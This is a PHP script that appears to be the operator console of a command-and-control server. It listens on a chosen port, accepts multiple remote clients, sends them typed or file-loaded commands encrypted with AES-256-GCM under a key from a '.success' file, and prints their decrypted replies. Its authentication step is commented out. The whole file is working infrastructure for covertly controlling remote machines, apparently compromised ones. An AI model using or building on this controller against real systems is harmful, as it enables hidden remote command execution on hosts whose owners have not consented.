#!/usr/bin/php -q
<?php

	//error_reporting(0);
	set_time_limit(0);
	ob_implicit_flush(1);
	define("DELIMITER", "-------------------------------------");

	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);

	if(count($opts) < 2){
		die("Assign remote ip [-h/--host] and port [-p/--port]\n");
	}

	/*************************	auth. ****************************/
	//require_once './serverlogin.php';
	//if(!calllogin()) die("Login failed");
	/************************* /auth. ****************************/

	
	$host_addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$host_port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);


	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)	// create
	{
	    die("[\33[91m!\33[0m] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\n");
	}


	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);	// options??


	if (socket_bind($master_sock, $host_addr, (int)$host_port) === false)	// bind
	{
	    die("[\33[91m!\33[0m] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
	}


	if (socket_listen($master_sock) === false)	// listen
	{
	    die("[\33[91m!\33[0m] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\n");
	}
	
	$key = file_get_contents(".success");

	define('KEY',$key);
	define('CYPHER', 'aes-256-gcm');

	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
	
	$clients = array($master_sock);
	$connected_clients 	 = array();

	while (true) {
		
	    // create a copy, so $clients doesn't get modified by socket_select()
		$write = $recv = $clients;
		$except = NULL;
		$now = date('H:i:s');

	    if(socket_select($recv, $write, $except, NULL) === false)
	    {
	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
	    }

	    if(in_array($master_sock, $recv))
	    {
			if (($clients[] = $recv_sock = socket_accept($master_sock)) === false)
			{
		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
		    }

			socket_getpeername($recv_sock, $ip, $port);
		    $connected_clients [] = array("ip" => $ip, "port" => $port);

		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";

	        // remove the listening socket from the clients-with-data array
	        $key = array_search($clients, $recv);
	        unset($recv[$key]);

	        continue;
	    }

	    foreach ($recv as $recv_sock)
	    {
	   	 	socket_clear_error($recv_sock);
	    	socket_getpeername($recv_sock, $ip, $port);
			$now = date('d/m/y H:i:s');
	        
			$data = "";
			$all_bytes = 0;

	        while(false !== ($bytes = socket_recv($recv_sock, $buffer, 4096, MSG_DONTWAIT)))
	        {
	        	$all_bytes += $bytes;
	        	echo "\33[94mBytes recieved: ".$bytes."\33[0m\n";
        	  	$lastError = socket_last_error($recv_sock);

			    if($bytes === 0)
			    {		
			    	echo $lastError !== 0 ? "Error: ".$lastError." :: ".socket_strerror($lastError)."\n" : "";
	   
			        $key  = array_search($recv_sock, $clients);
		            $_key = array_search($port, array_map(function($v){return $v['port'];},$connected_clients));
		            
		            unset($clients[$key]);
		            unset($recv[$key]);
		            unset($write[$key]);
		            unset($connected_clients[$_key]); 	// in non-local environment - ip instead of port
		            
		            echo "[".$now."] \33[91mClient ".$ip.":".$port." disconnected.\33[0m\n";
		            break;
			    }
			    else if (intval($bytes) > 0) {
			        $data .= $buffer;
			    }
			    else
			    {
		           	echo $lastError !== 0 ? "No data\nError: ".$lastError." :: ".socket_strerror($lastError)."\n" : "";
			    }
	        }


        	echo $all_bytes < 4096 ? "" : "\33[95mOverall bytes recieved: ".$all_bytes."\33[0m\n";

	        if($data !== "")
	        {
        		$data = trim(__decrypt($data));
		    	echo "[".$now."] Client [\33[36m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";
	        }

		}

		$line = readline(">>> ");
		if($line !== "")
		{
			readline_add_history($line);
		}

		// reading/sending a file of commands
		if(preg_match('/^(\-f)*\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
		{
			$file = substr($line, 3);

			if(file_exists($file))
			{
				$fp = fopen($file, 'rb');
				$cmdsarr = explode("\n", fread($fp, filesize($file)));
				fclose($fp);
				$full_cmd = "";
				
				foreach ($cmdsarr as $cmd)
				{
					$full_cmd .= trim($cmd);
				}
				$full_cmd = __encrypt($full_cmd);

				foreach ($write as $send_sock)
		  		{
			        if($send_sock == $master_sock)
			            continue;

			        else if(@socket_write($send_sock, $full_cmd."\n", strlen($full_cmd)) === false)
			        {	
			        	echo "[\33[91mWrite error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
			        }	
		    	}
				continue;
			}
			else 
			{
				echo "Invalid path.\n";
				continue;
			}
		}

	    switch ($line)
	    {

	    	case 'clients':
	    		echo "\33[36mClients: ".(count($clients)-1)."\33[0m\n";
	    		print_r($connected_clients);
	    		break;

	    	case 'exit':
				echo "Closing master socket..\n";
				socket_close($master_sock);	
				exit(0);

	    	default:
	    		break;
	    }

		if(!empty($connected_clients) && !empty($write))
		{
		    if(!empty($line) 
		    	&& $line != 'clients'
				&& $line != 'exit')
		    {
		    	$line = __encrypt($line);

			  	foreach ($write as $send_sock)
			  	{
			        if($send_sock == $master_sock)
			            continue;

			        else if(@socket_write($send_sock, $line."\n", strlen($line)) === false)
			        {	
			        	echo "\33[91m[Write error\33[0m]: ".socket_strerror(socket_last_error($send_sock))."\n";
			        }	
			    }
			    sleep(1); // wait for response
			}
		}

		if(count($clients) === 1)	// only master socket => no clients
		{
			echo "[\33[91mNo connected clients\33[0m]: Listening..\n";
			$line = "";
		}
	}

	echo "Closing master socket..\n";
	socket_close($master_sock);
	exit(0);

	/*:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/

	function __encrypt($message)
	{
		$msg = base64_encode($message);

		if(in_array(CYPHER, openssl_get_cipher_methods()))
		{
			$ivlen     = openssl_cipher_iv_length(CYPHER);
			$iv        = openssl_random_pseudo_bytes($ivlen);
			$cyphertxt = openssl_encrypt($msg, CYPHER, KEY, $options=0, $iv, $tag);
		}

	    return base64_encode($cyphertxt).':'.bin2hex($iv).':'.bin2hex($tag);
	}

	function __decrypt($input)
	{
		$encrypted  = explode(":", $input);

		if(is_base64($encrypted[0])) // cyphertext without ivector/tag
		{
			$cyphertext =  base64_decode($encrypted[0]);
			$iv         =  hex2bin($encrypted[1]);
			$tag        =  hex2bin($encrypted[2]);

			$original = openssl_decrypt($cyphertext, CYPHER, KEY, $options=0, $iv, $tag);

			return base64_decode($original);
		}
		return $input;
	}


	function is_base64(string $s) : bool
	{
		return base64_decode($s, true) === false ? false : true;
		/*  || ((substr($s, -2) !== '==') 
			|| (substr($s, -1) !== '=')))
			 ? false : true;
		*/
	}
?>
